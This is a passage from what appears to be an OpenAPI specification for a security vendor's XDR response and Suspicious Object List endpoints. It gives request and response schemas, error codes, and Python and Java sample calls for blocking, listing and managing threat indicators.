                            "description": "block item value type",
                            "type": "string",
                            "enum": [
                              "file_sha1",
                              "ip",
                              "domain",
                              "url",
                              "mailbox"
                            ],
                            "example": "file_sha1"
                          },
                          "targetValue": {
                            "description": "item value info",
                            "type": "string",
                            "example": "2de5c1125d5f991842727ed8ea8b5fda0ffa249b"
                          },
                          "actionId": {
                            "description": "8 digit group id to identify action",
                            "example": 88139521,
                            "type": "string"
                          },
                          "error": {
                            "type": "object",
                            "description": "error for individual tasks",
                            "required": [
                              "code",
                              "message"
                            ],
                            "properties": {
                              "code": {
                                "type": "string",
                                "description": "error class",
                                "example": "PartialContent"
                              },
                              "message": {
                                "type": "string",
                                "description": "detail error message",
                                "example": "task duplicated"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Common"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/batchBlock'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'items': [\n        {\n            'valueType': 'YOUR_VALUETYPE (string)',\n            'targetValue': 'YOUR_TARGETVALUE (string)',\n            'description': 'YOUR_DESCRIPTION (string)'\n        }\n    ]\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/batchBlock\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"items\\\": [\" +\n                \"        {\" +\n                \"            \\\"valueType\\\": \\\"YOUR_VALUETYPE (string)\\\",\" +\n                \"            \\\"targetValue\\\": \\\"YOUR_TARGETVALUE (string)\\\",\" +\n                \"            \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"        }\" +\n                \"    ]\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/listTasks": {
      "get": {
        "summary": "List response tasks",
        "description": "Retrieves a list of response tasks\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "data"
                  ],
                  "properties": {
                    "data": {
                      "description": "task info",
                      "type": "array",
                      "items": {
                        "required": [
                          "actionId",
                          "taskStatus"
                        ],
                        "properties": {
                          "actionId": {
                            "description": "8 digit group id to identify action",
                            "example": 88139521,
                            "type": "string"
                          },
                          "taskStatus": {
                            "description": "task status",
                            "type": "string",
                            "example": "timeout",
                            "enum": [
                              "pending",
                              "queued",
                              "ongoing",
                              "success",
                              "failed",
                              "timeout",
                              "skipped",
                              "canceled",
                              "pendingApproval",
                              "rejected"
                            ]
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Common"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/listTasks'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/listTasks\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/suspiciousObjects": {
      "get": {
        "summary": "Get Suspicious Object List",
        "description": "Retrieves information about domains, file SHA-1 , file SHA-256, IP addresses, email addresses, or URLs that are in the Suspicious Object List\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Suspicious Object List"
        ],
        "parameters": [
          {
            "name": "skipToken",
            "description": "The skipToken is obtained from the nextLink returned in the previous query, and is used to provide the next page of entries in paginated output.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "eyJpZCI6IjI1MGQxMmE3ZDQyMmVhMzhlOGE4OWY4NTJkZDQ0MzQwNTBhNTk4ZjBmMDU3OWU1Y2RiNDI0ZWI5MTgyZTc1YzciLCJjdXN0b21lcl9pZCI6IjFhOGRjODE0LWM2YzgtNGRlMy1hNDE1LTVlNzBjZGIyNzFmYSIsInVwZGF0ZWRfdGltZSI6MTYxMDQ1MDI1MX0="
            }
          },
          {
            "name": "limit",
            "description": "The maximum number of Suspicious Objects returned in paginated output. This value can be a maximum of 1000. If you don't use this parameter, the default is 1000.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "number",
              "example": 100
            }
          },
          {
            "name": "type",
            "description": "Suspicious Object type, such as \"domain\", \"ip\", \"sha1\", or \"url\". Use a comma to separate multiple values. If you don't use this parameter, the response will include all Suspicious Object types.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "ip,sha1"
            }
          },
          {
            "name": "startTime",
            "description": "Timestamp in ISO 8601 format (yyyy-mm-ddThh:mm:ss.mmmZ in UTC) that indicates the start of the data retrieval time range.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "2021-03-21T03:08:40Z"
            }
          },
          {
            "name": "contentFilter",
            "description": "Filters the Suspicious Object List to match the specified string.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "1.alisiosanguera.com.cn"
            }
          }
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Return data",
                      "type": "object",
                      "required": [
                        "suspiciousObjectList"
                      ],
                      "properties": {
                        "nextLink": {
                          "type": "string",
                          "description": "The link to the next page for paginated output. This value includes the skiptoken at the end of the link. nextLink will not return if no further pages.",
                          "example": "https://api.xdr.trendmicro.com/v2.0/xdr/threatintel/suspiciousObjects?limit=20&skipToken=eyJpZCI6IjI1MGQxMmE3ZDQyMmVhM"
                        },
                        "suspiciousObjectList": {
                          "type": "array",
                          "items": {
                            "type": "object",
                            "required": [
                              "type",
                              "value",
                              "riskLevel",
                              "scanAction",
                              "lastModified",
                              "expiredTime",
                              "hitException"
                            ],
                            "properties": {
                              "type": {
                                "description": "The Suspicious Object type, such as \"domain\", \"ip\", \"sha1\", or \"url\".",
                                "example": "domain",
                                "type": "string",
                                "enum": [
                                  "domain",
                                  "ip",
                                  "sha1",
                                  "sha256",
                                  "url",
                                  "email_sender"
                                ]
                              },
                              "value": {
                                "description": "The Suspicious Object record value.",
                                "example": "1.alisiosanguera.com.cn",
                                "type": "string"
                              },
                              "description": {
                                "description": "Description info of the record.",
                                "type": "string",
                                "example": "it is an example Suspicious Object record"
                              },
                              "scanAction": {
                                "description": "Suspicious Object record scan action.",
                                "example": "log",
                                "type": "string",
                                "enum": [
                                  "block",
                                  "log"
                                ]
                              },
                              "riskLevel": {
                                "description": "The Suspicious Object risk level.",
                                "example": "high",
                                "type": "string",
                                "enum": [
                                  "high",
                                  "medium",
                                  "low"
                                ]
                              },
                              "hitException": {
                                "description": "If Suspicious Object record in exception list.",
                                "type": "boolean",
                                "example": false
                              },
                              "lastModified": {
                                "description": "The Suspicious Object record last modified time.",
                                "example": "2021-03-22T03:08:40Z",
                                "type": "string"
                              },
                              "expiredTime": {
                                "description": "The Suspicious Object record expired time.",
                                "example": "2021-04-22T03:08:40Z",
                                "type": "string"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/suspiciousObjects'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'skipToken': 'YOUR_SKIPTOKEN (string)',\n    'limit': 'YOUR_LIMIT (number)',\n    'type': 'YOUR_TYPE (string)',\n    'startTime': 'YOUR_STARTTIME (string)',\n    'contentFilter': 'YOUR_CONTENTFILTER (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/suspiciousObjects\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"skipToken\", \"YOUR_SKIPTOKEN (string)\")\n                .addParameter(\"limit\", \"YOUR_LIMIT (number)\")\n                .addParameter(\"type\", \"YOUR_TYPE (string)\")\n                .addParameter(\"startTime\", \"YOUR_STARTTIME (string)\")\n                .addParameter(\"contentFilter\", \"YOUR_CONTENTFILTER (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "post": {
        "summary": "Add objects to Suspicious Object List",
        "description": "Adds domains, file SHA-1, file SHA-256, IP addresses, email addresses, or URLs to the Suspicious Object List\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Manage lists and configure settings</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Suspicious Object List"
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "data"
                ],
                "properties": {
                  "data": {
                    "description": "The Suspicious Objects to be added to the Suspicious Object List.",
                    "type": "array",
                    "items": {
                      "type": "object",
                      "required": [
                        "type",
                        "value"
                      ],
                      "properties": {
                        "type": {
                          "description": "The Suspicious Object type.",
                          "example": "domain",
                          "type": "string",
                          "enum": [
                            "domain",
                            "ip",
                            "sha1",
                            "sha256",
                            "url",
                            "email_sender"
                          ]
                        },
                        "value": {
                          "description": "The Suspicious Object value.",
                          "example": "1.alisiosanguera.com.cn",
                          "type": "string"
                        },
                        "description": {
                          "description": "The Suspicious Object description info",
                          "type": "string",
                          "example": "Example Suspicious Object."
                        },
                        "scanAction": {
                          "description": "The Suspicious Object scan action. If you don't use this parameter, the scan action specified in default_settings.riskLevel.type will be used instead.",
                          "example": "log",
                          "type": "string",
                          "enum": [
                            "block",
                            "log"
                          ]
                        },
                        "riskLevel": {
                          "description": "The Suspicious Object risk level. If you don't use this parameter, high will be used instead.",
                          "example": "high",
                          "type": "string",
                          "enum": [
                            "high",
                            "medium",
                            "low"
                          ]
                        },
                        "expiredDay": {
                          "description": "The Suspicious Object expiry day. If you don't use this parameter, the default_settings.expiredDay scan action will be used instead.",
                          "example": 15,
                          "type": "integer"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "data": {
                      "description": "Return data",
                      "type": "object",
                      "properties": {}
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_SET_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/suspiciousObjects'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'data': [\n        {\n            'type': 'YOUR_TYPE (string)',\n            'value': 'YOUR_VALUE (string)',\n            'description': 'YOUR_DESCRIPTION (string)',\n            'scanAction': 'YOUR_SCANACTION (string)',\n            'riskLevel': 'YOUR_RISKLEVEL (string)',\n            'expiredDay': 'YOUR_EXPIREDDAY (integer)'\n        }\n    ]\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/suspiciousObjects\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"data\\\": [\" +\n                \"        {\" +\n                \"            \\\"type\\\": \\\"YOUR_TYPE (string)\\\",\" +\n                \"            \\\"value\\\": \\\"YOUR_VALUE (string)\\\",\" +\n                \"            \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\",\" +\n                \"            \\\"scanAction\\\": \\\"YOUR_SCANACTION (string)\\\",\" +\n                \"            \\\"riskLevel\\\": \\\"YOUR_RISKLEVEL (string)\\\",\" +\n                \"            \\\"expiredDay\\\": \\\"YOUR_EXPIREDDAY (integer)\\\"\" +\n                \"        }\" +\n                \"    ]\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/suspiciousObjects/delete": {
      "post": {
        "summary": "Delete objects from Suspicious Object List",
        "description": "Deletes domains, file SHA-1, file SHA-256, IP addresses, URLs or email addresses, from the Suspicious Object List\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Manage lists and configure settings</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Suspicious Object List"
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "data"
                ],
                "properties": {
                  "data": {
                    "description": "The Suspicious Objects to be deleted from the Suspicious Object List.",
                    "type": "array",
                    "items": {
                      "type": "object",
                      "required": [
                        "type",
                        "value"
                      ],
                      "properties": {
                        "type": {
                          "description": "The Suspicious Object type.",
                          "example": "domain",
                          "type": "string",
                          "enum": [
                            "domain",
                            "ip",
                            "sha1",
                            "sha256",
                            "url",
                            "email_sender"
                          ]
                        },
                        "value": {
                          "description": "The value of the Suspicious Object to be deleted from the Suspicious Object List.",
                          "example": "1.alisiosanguera.com.cn",
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "data": {
                      "description": "Return data",
                      "type": "object",
                      "properties": {}
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_SET_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
